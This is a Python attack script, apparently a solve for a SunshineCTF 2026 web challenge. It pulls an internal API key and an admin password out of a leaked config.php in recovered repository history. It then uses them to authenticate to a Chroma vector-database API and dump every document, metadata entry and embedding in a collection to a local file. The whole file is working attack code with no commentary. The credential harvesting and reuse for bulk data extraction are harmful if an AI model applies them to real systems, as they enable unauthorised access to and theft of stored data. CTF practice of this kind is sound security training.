#!/usr/bin/env python
import base64, json, re, sys, urllib.error, urllib.request
try: sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception: pass
CFG = open("files/repo-history/c2/config.php", encoding="utf-8").read()
KEY = re.search(r"INTERNAL_API_KEY',\s*'([^']+)'", CFG).group(1)
BASIC = base64.b64encode(b"vecadmin:" + re.search(r"MAIL_ADMIN_PASS',\s*'([^']+)'", CFG).group(1).encode()).decode()
BASE = "http://vec.web.2026.sunshinectf.games:8000"
P = ("/api/v2/tenants/default_tenant/databases/default_database/collections/"
     "455b419b-9668-4e7e-9f44-7ed62396f184")
def go(method, path, body=None):
    h = {"Content-Type": "application/json", "X-API-Key": KEY, "Authorization": "Basic " + BASIC}
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(BASE + path, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return type(e).__name__, str(e).encode()
st, b = go("POST", P + "/get", {"include": ["metadatas", "documents", "embeddings", "uris"]})
d = json.loads(b)
print(b[:900])
open("analysis/chroma_dump.json", "w").write(json.dumps(d))
print(st, [len(d.get(k) or []) if isinstance(d.get(k), list) else d.get(k) for k in ("ids","documents","metadatas","embeddings")])
for i, rid in enumerate(d.get("ids") or []):
    e = (d.get("embeddings") or [None]*3)[i]
    print("\n==", rid, "| doc:", repr((d.get("documents") or [None]*3)[i]), "| meta:", d["metadatas"][i])
    if e:
        arr = e["embedding"] if isinstance(e, dict) and "embedding" in e else e
        print("   dim", len(arr), "first10", [round(float(x), 5) for x in arr[:10]])
